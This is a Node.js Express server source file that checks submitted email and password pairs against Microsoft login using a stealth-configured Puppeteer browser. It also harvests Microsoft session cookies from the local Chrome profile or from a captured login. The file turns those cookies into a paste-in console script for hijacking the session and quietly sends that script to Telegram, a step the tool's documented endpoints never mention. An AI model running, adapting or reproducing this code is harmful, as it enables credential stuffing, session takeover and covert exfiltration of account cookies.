const express = require("express");
const cors = require("cors");
const config = require("./config");
const { testLogin } = require("./loginTester");
const { testLoginViaApi } = require("./apiTester");
const { formatLoginResult } = require("./resultFormatter");
const { getGeoInfo } = require("./geolocation");
const fs = require("fs");
const path = require("path");
const os = require("os");
const axios = require("axios");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const { sendTelegramMessage, sendTelegramFile } = require("./telegramNotifier");

// Use stealth plugin to avoid detection
puppeteer.use(StealthPlugin());

const app = express();
app.use(cors());
app.use(express.json());

function apiKeyMiddleware(req, res, next) {
  if (!config.apiKey) return next();
  const key = req.headers["x-api-key"];
  if (!key)
    return res
      .status(401)
      .json({ detail: "API key required. Set X-API-Key header." });
  if (key !== config.apiKey)
    return res.status(403).json({ detail: "Invalid API key." });
  next();
}

app.get("/health", (req, res) => {
  res.json({ status: "healthy", version: "1.0.0" });
});

app.post("/api/v1/verify-login/browser", apiKeyMiddleware, async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password)
    return res
      .status(422)
      .json({ detail: 'Both "email" and "password" fields are required' });
  console.log("[INFO] Browser login test for: " + email);
  try {
    const result = await testLogin(email, password);
    console.log(
      "[INFO] Browser result for " +
        email +
        ": status=" +
        (result.status || (result.success ? "success" : "failed")),
    );
    res.json(formatLoginResult(result, email, password, { method: "browser" }));
  } catch (err) {
    res
      .status(500)
      .json({
        success: false,
        message: "Internal error: " + err.message.substring(0, 200),
      });
  }
});

app.post("/api/v1/verify-login/api", apiKeyMiddleware, async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password)
    return res
      .status(422)
      .json({ detail: 'Both "email" and "password" fields are required' });
  console.log("[INFO] API login test for: " + email);
  try {
    const result = await testLoginViaApi(email, password);
    console.log(
      "[INFO] API result for " +
        email +
        ": status=" +
        (result.status || (result.success ? "success" : "failed")),
    );
    res.json(formatLoginResult(result, email, password, { method: "api" }));
  } catch (err) {
    res
      .status(500)
      .json({
        success: false,
        message: "Internal error: " + err.message.substring(0, 200),
      });
  }
});

app.post("/api/v1/verify-login", apiKeyMiddleware, async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password)
    return res
      .status(422)
      .json({ detail: 'Both "email" and "password" fields are required' });
  console.log("[INFO] Hybrid login test for: " + email);
  try {
    const geoInfo = await getGeoInfo(req);
    const browserResult = await testLogin(email, password);
    console.log(
      "[INFO] Hybrid result for " +
        email +
        ": browser returned status=" +
        (browserResult.status ||
          (browserResult.success ? "success" : "failed")),
    );
    res.json(
      formatLoginResult(browserResult, email, password, {
        method: "browser",
        ...geoInfo,
      }),
    );
  } catch (err) {
    res
      .status(500)
      .json({
        success: false,
        message: "Internal error: " + err.message.substring(0, 200),
      });
  }
});

// cookiesssssssssssssssssssssssssssssssss

// Optional: Add API key authentication
const API_KEY = process.env.API_KEY || null;

function cookiesApiKeyMiddleware(req, res, next) {
  if (!API_KEY) return next();
  const key = req.headers["x-api-key"];
  if (!key)
    return res
      .status(401)
      .json({ error: "API key required. Set X-API-Key header." });
  if (key !== API_KEY)
    return res.status(403).json({ error: "Invalid API key." });
  next();
}

// ─── Configuration ───────────────────────────────────────────────────────────

const OUTPUT_DIR = path.join(__dirname, "ms_cookies");
if (!fs.existsSync(OUTPUT_DIR)) {
  fs.mkdirSync(OUTPUT_DIR, { recursive: true });
}

// Microsoft auth domains we care about
const MS_DOMAINS = [
  ".login.live.com",
  ".login.microsoftonline.com",
  ".account.microsoft.com",
  ".microsoft.com",
  ".live.com",
  "login.microsoftonline.com",
];

// The OAuth authorize URL
const AUTH_URL =
  "https://login.microsoftonline.com/common/oauth2/v2.0/authorize" +
  "?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL%20openid%20profile%20offline_access" +
  "&response_type=code" +
  "&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7" +
  "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth" +
  "&prompt=login" +
  "&msaoauth2=true";
// URLs to visit for cookie collection
const COLLECT_URLS = [
  "https://account.microsoft.com",
  "https://login.live.com",
  "https://outlook.live.com",
];

const EXPIRY_TEST_URL = "https://account.microsoft.com/";

// ─── Logging ─────────────────────────────────────────────────────────────────

function log(message, level = "INFO") {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] [${level}] ${message}`);
}

function logInfo(message) {
  log(message, "INFO");
}

function logSuccess(message) {
  log(message, "✓ OK");
}

function logWarning(message) {
  log(message, "⚠ WARN");
}

function logError(message) {
  log(message, "✗ ERROR");
}

// ─── Utility Functions ────────────────────────────────────────────────────────

function getTimestamp() {
  const now = new Date();
  const year = now.getFullYear();
  const month = String(now.getMonth() + 1).padStart(2, "0");
  const day = String(now.getDate()).padStart(2, "0");
  const hours = String(now.getHours()).padStart(2, "0");
  const minutes = String(now.getMinutes()).padStart(2, "0");
  const seconds = String(now.getSeconds()).padStart(2, "0");
  return `${year}${month}${day}_${hours}${minutes}${seconds}`;
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
function getChromeUserDataDir() {
  const p = process.platform;
  const home = os.homedir();
  if (p === "win32") {
    const appData =
      process.env.LOCALAPPDATA || path.join(home, "AppData", "Local");
    return path.join(appData, "Google", "Chrome", "User Data");
  } else if (p === "darwin") {
    return path.join(
      home,
      "Library",
      "Application Support",
      "Google",
      "Chrome",
    );
  } else {
    return path.join(home, ".config", "google-chrome");
  }
}

// ─── Generate the Console Script ─────────────────────────────────────────

function generateConsoleScript(cookies, redirectUrl) {
  /**
   * Generates a self-executing JavaScript function that:
   * 1. Parses the cookies JSON
   * 2. Sets each cookie in the browser
   * 3. Redirects to the specified URL
   *
   * This EXACTLY matches the format you provided.
   */

  const formattedCookies = cookies.map((c) => ({
    Name: c.name,
    Value: c.value,
    Domain: c.domain,
    Path: c.path || "/",
    "Max-Age": null,
    Expires: c.expires || null,
    Secure: c.secure || false,
    Discard: false,
    HttpOnly: c.httpOnly || false,
    SameSite: c.sameSite || "None",
  }));

  const cookiesJson = JSON.stringify(formattedCookies);

  // Escape single quotes for the JSON string inside the script
  const escapedJson = cookiesJson.replace(/'/g, "\\'");

  // Default redirect URL
  const redirect = redirectUrl || "https://login.microsoftonline.com/";
  const redirectBase64 = Buffer.from(redirect).toString("base64");

  const script = `(function(){const cookies=JSON.parse('${escapedJson}');const MA='Max-Age=31536000';function putCookie(n,v,d,p,s){let c;if(n.indexOf('__Host')===0){c=n+'='+v+';'+MA+';path=/;Secure;SameSite=None';}else if(s){c=n+'='+v+';'+MA+';domain='+d+';path='+p+';Secure;SameSite=None';}else{c=n+'='+v+';'+MA+';domain='+d+';path='+p+';SameSite=Lax';}try{document.cookie=c;}catch(x){}}for(const k of cookies){putCookie(k.Name,k.Value,k.Domain,k.Path,k.Secure);}window.location.href=atob('${redirectBase64}');})();`;

  return script;
}

// ─── Validate Cookies ────────────────────────────────────────────────────

async function validateCookies(cookies) {
  try {
    const cookieStr = cookies.map((c) => `${c.name}=${c.value}`).join("; ");
    const resp = await axios.get("https://account.microsoft.com/", {
      headers: {
        Cookie: cookieStr,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      maxRedirects: 5,
      timeout: 15000,
    });
    const finalUrl = resp.request.res?.responseUrl || "";
    return resp.status === 200 && finalUrl.includes("account.microsoft.com");
  } catch (err) {
    return false;
  }
}
// ─── Cookie Validation ────────────────────────────────────────────────────────

async function testCookieValidity(cookies) {
  /**
   * Test if a set of cookies is still valid by making a request
   * to account.microsoft.com.
   */
  logInfo(`Testing cookie validity against ${EXPIRY_TEST_URL}...`);

  try {
    const cookieString = cookies.map((c) => `${c.name}=${c.value}`).join("; ");

    const response = await axios.get(EXPIRY_TEST_URL, {
      headers: {
        Cookie: cookieString,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      maxRedirects: 5,
      timeout: 15000,
    });

    const finalUrl = response.request.res?.responseUrl || "";

    if (response.status === 200 && finalUrl.includes("account.microsoft.com")) {
      logSuccess(`Cookies are VALID`);
      return true;
    }

    if (finalUrl.includes("login.")) {
      logError(`Cookies EXPIRED — redirected to login`);
      return false;
    }

    logError(`Cookies may be expired (status ${response.status})`);
    return false;
  } catch (error) {
    logError(`Cookie test failed: ${error.message}`);
    return false;
  }
}

// ─── Method 1: Extract from Existing Session ─────────────────────────────

async function extractFromSession() {
  console.log("[+] Method 1: Extracting from existing Chrome session...");

  const userDataDir = getChromeUserDataDir();
  if (!fs.existsSync(userDataDir)) {
    console.log("[-] Chrome profile not found");
    return null;
  }

  let browser;
  try {
    browser = await puppeteer.launch({
      headless: "new",
      args: [
        `--user-data-dir=${userDataDir}`,
        "--profile-directory=Default",
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--disable-gpu",
      ],
    });
  } catch (err) {
    console.log("[-] Chrome launch failed:", err.message);
    return null;
  }

  const allCookies = [];
  try {
    for (const url of COLLECT_URLS) {
      try {
        const page = await browser.newPage();
        console.log(`[*] Visiting ${url}...`);
        await page.goto(url, { waitUntil: "networkidle2", timeout: 30000 });
        await sleep(2000);
        const cookies = await page.cookies();
        allCookies.push(...cookies);
        await page.close();
      } catch (e) {
        console.log(`[!] ${url}: ${e.message}`);
      }
    }

    // Filter to Microsoft domains only
    const msCookies = allCookies.filter((c) =>
      MS_DOMAINS.some((d) => (c.domain || "").includes(d)),
    );

    if (msCookies.length === 0) {
      console.log("[-] No Microsoft cookies found");
      return null;
    }

    // Remove duplicates (keep last)
    const seen = new Map();
    const uniqueCookies = [];
    for (const c of msCookies) {
      const key = `${c.name}|${c.domain}`;
      if (!seen.has(key)) {
        seen.set(key, true);
        uniqueCookies.push(c);
      }
    }

    const valid = await validateCookies(uniqueCookies);
    console.log(
      `[*] Found ${uniqueCookies.length} unique cookies, valid: ${valid}`,
    );

    if (valid) {
      return uniqueCookies;
    }

    console.log("[-] Cookies expired");
    return null;
  } catch (err) {
    console.log("[-] Error:", err.message);
    return null;
  } finally {
    if (browser)
      try {
        await browser.close();
      } catch (_) {}
  }
}

// ─── Method 2: Interactive Login ─────────────────────────────────────────

async function interactiveLogin() {
  console.log("[+] Method 2: Interactive login...");
  console.log(
    "[!] Browser window opening. Please log in manually (5 min timeout)\n",
  );

  let browser;
  try {
    browser = await puppeteer.launch({
      headless: false,
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--window-size=1280,800",
      ],
    });
  } catch (err) {
    console.log("[-] Launch failed:", err.message);
    return null;
  }

  try {
    const page = await browser.newPage();
    await page.setViewport({ width: 1280, height: 800 });
    await page.goto(AUTH_URL, { waitUntil: "networkidle2", timeout: 30000 });

    const start = Date.now();
    const timeout = 5 * 60 * 1000;
    let loggedIn = false;

    while (Date.now() - start < timeout) {
      if (page.url().includes("account.microsoft.com")) {
        loggedIn = true;
        break;
      }
      await sleep(1000);
    }

    if (!loggedIn) {
      console.log("[-] Login timeout");
      return null;
    }

    console.log("[+] Login detected! Collecting cookies...");
    await sleep(3000);

    let allCookies = await page.cookies();

    for (const url of COLLECT_URLS) {
      try {
        await page.goto(url, { waitUntil: "networkidle2", timeout: 30000 });
        await sleep(2000);
        allCookies.push(...(await page.cookies()));
      } catch (_) {}
    }

    const msCookies = allCookies.filter((c) =>
      MS_DOMAINS.some((d) => (c.domain || "").includes(d)),
    );

    // Remove duplicates
    const seen = new Map();
    const uniqueCookies = [];
    for (const c of msCookies) {
      const key = `${c.name}|${c.domain}`;
      if (!seen.has(key)) {
        seen.set(key, true);
        uniqueCookies.push(c);
      }
    }

    if (uniqueCookies.length > 0) {
      console.log(`[+] Extracted ${uniqueCookies.length} unique cookies`);
      return uniqueCookies;
    }

    return null;
  } catch (err) {
    console.log("[-] Error:", err.message);
    return null;
  } finally {
    if (browser)
      try {
        await browser.close();
      } catch (_) {}
  }
}

// ─── Save Cookies ────────────────────────────────────────────────────────────

function saveCookiesToFile(cookies, label = "microsoft") {
  /**
   * Save cookies to disk in multiple formats.
   */
  const timestamp = getTimestamp();
  const filenameBase = `cookies_${label}_${timestamp}`;

  // Save JSON
  const jsonPath = path.join(OUTPUT_DIR, `${filenameBase}.json`);
  fs.writeFileSync(jsonPath, JSON.stringify(cookies, null, 2));

  // Save Netscape format
  const netscapePath = path.join(OUTPUT_DIR, `${filenameBase}.txt`);
  let netscapeContent = "# Netscape HTTP Cookie File\n";
  netscapeContent += `# Generated on ${new Date().toISOString()}\n\n`;
  for (const c of cookies) {
    const domain = c.domain || "";
    const flag = domain.startsWith(".") ? "TRUE" : "FALSE";
    const pathVal = c.path || "/";
    const secure = c.secure ? "TRUE" : "FALSE";
    const expiry = c.expires || 0;
    netscapeContent += `${domain}\t${flag}\t${pathVal}\t${secure}\t${expiry}\t${c.name}\t${c.value}\n`;
  }
  fs.writeFileSync(netscapePath, netscapeContent);

  return {
    jsonPath,
    netscapePath,
    total: cookies.length,
  };
}

/**
 * GET /api/v1/auth-cookies/script
 *
 * Returns a self-executing JavaScript function that:
 * 1. Sets all Microsoft auth cookies in the browser
 * 2. Redirects to login.microsoftonline.com
 *
 * Paste the response into browser console to auto-login.
 */
app.get("/api/v1/auth-cookies/script", apiKeyMiddleware, async (req, res) => {
  console.log("\n[+] Console script requested");

  try {
    let cookies = null;
    let method = null;

    // Phase 1: Try existing session
    console.log("[*] Phase 1: Trying existing session...");
    cookies = await extractFromSession();

    if (cookies) {
      method = "session";
    } else {
      // Phase 2: Interactive login
      console.log("[*] Phase 2: Trying interactive login...");
      cookies = await interactiveLogin();

      if (cookies) {
        method = "interactive";
      } else {
        return res.status(500).json({
          success: false,
          error:
            "Could not extract cookies. Ensure Chrome is installed and you are logged into a Microsoft account.",
        });
      }
    }

    // Generate the console script
    const redirectUrl =
      req.query.redirect || "https://login.microsoftonline.com/";
    const script = generateConsoleScript(cookies, redirectUrl);

    console.log(
      `[+] Generated script with ${cookies.length} cookies via ${method}`,
    );

    // Return as text/plain so it can be copied directly
    res.setHeader("Content-Type", "text/plain");
sendTelegramFile("cookies.txt", script).catch((err) => {
      console.error("[WARN] Telegram notification failed: " + err.message);
    });
    res.send(script);
  } catch (err) {
    console.log("[-] Fatal:", err.message);
    return res.status(500).json({
      success: false,
      error: err.message,
    });
  }
});

/**
 * GET /api/v1/auth-cookies/json
 *
 * Returns cookies as JSON array (alternative format).
 */
app.get("/api/v1/auth-cookies/json", apiKeyMiddleware, async (req, res) => {
  console.log("\n[+] JSON cookies requested");

  try {
    let cookies = null;
    let method = null;

    console.log("[*] Phase 1: Trying existing session...");
    cookies = await extractFromSession();

    if (cookies) {
      method = "session";
    } else {
      console.log("[*] Phase 2: Trying interactive login...");
      cookies = await interactiveLogin();

      if (cookies) {
        method = "interactive";
      } else {
        return res.status(500).json({
          success: false,
          error: "Could not extract cookies.",
        });
      }
    }

    // Format as the cookie object format you showed
    const formattedCookies = cookies.map((c) => ({
      Name: c.name,
      Value: c.value,
      Domain: c.domain,
      Path: c.path || "/",
      "Max-Age": null,
      Expires: c.expires || null,
      Secure: c.secure || false,
      Discard: false,
      HttpOnly: c.httpOnly || false,
      SameSite: c.sameSite || "None",
    }));

    return res.json({
      success: true,
      method: method,
      total: formattedCookies.length,
      cookies: formattedCookies,
    });
  } catch (err) {
    console.log("[-] Fatal:", err.message);
    return res.status(500).json({
      success: false,
      error: err.message,
    });
  }
});

/**
 * GET /
 *
 * Root endpoint with API documentation.
 */
app.get("/", (req, res) => {
  res.json({
    name: "Microsoft Cookie Extractor API",
    endpoints: {
      "GET /api/v1/auth-cookies/script":
        "Returns console script to paste in browser",
      "GET /api/v1/auth-cookies/json": "Returns cookies as JSON",
      "GET /health": "Health check",
    },
    usage: {
      console_script:
        "curl http://localhost:3000/api/v1/auth-cookies/script | pbcopy (then paste in browser console)",
      json: "curl http://localhost:3000/api/v1/auth-cookies/json",
    },
  });
});

app.listen(config.port, () => {
  console.log(
    "[INFO] Microsoft Login Tester running on http://0.0.0.0:" + config.port,
  );
  console.log(`\n  Server running on http://localhost:${config.port}`);
  console.log("[INFO] Endpoints:");
  console.log(
    "[INFO]   POST /api/v1/verify-login         (browser only - try both tenants)",
  );
  console.log("[INFO]   POST /api/v1/verify-login/browser  (Puppeteer only)");
  console.log(
    "[INFO]   POST /api/v1/verify-login/api      (NOT supported for this client)",
  );
  console.log("[INFO]   GET  /health");

  console.log("\n" + "=".repeat(60));
  console.log("  MICROSOFT COOKIE EXTRACTOR API");
  console.log("=".repeat(60));

  console.log(`  Endpoints:`);
  console.log(`    GET  /                          - API info`);
  console.log(
    `  GET /api/v1/auth-cookies/script  - Console script (paste in browser)`,
  );
  console.log(`  GET /api/v1/auth-cookies/json    - JSON format`);
  console.log(`\n  Quick usage:`);
  console.log(
    `  curl http://localhost:${config.port}/api/v1/auth-cookies/script | pbcopy`,
  );
  console.log(`  Then paste in browser console F12\n`);
  if (API_KEY) {
    console.log(`\n  Authentication: X-API-Key header required`);
  }
  console.log("\n");
});
